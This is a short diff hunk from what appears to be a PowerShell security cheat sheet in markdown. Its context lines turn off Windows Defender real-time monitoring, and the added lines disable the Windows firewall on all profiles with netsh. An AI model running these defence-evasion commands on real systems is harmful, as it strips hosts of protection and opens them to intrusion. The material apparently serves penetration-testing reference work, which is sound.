@@ -83,6 +83,8 @@ Invoke-Expression $Command
 # Deactivate antivirus from powershell session (if user has rights to do so)
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+# Disable firewall
+netsh advfirewall set allprofiles state off
 
 ```
 
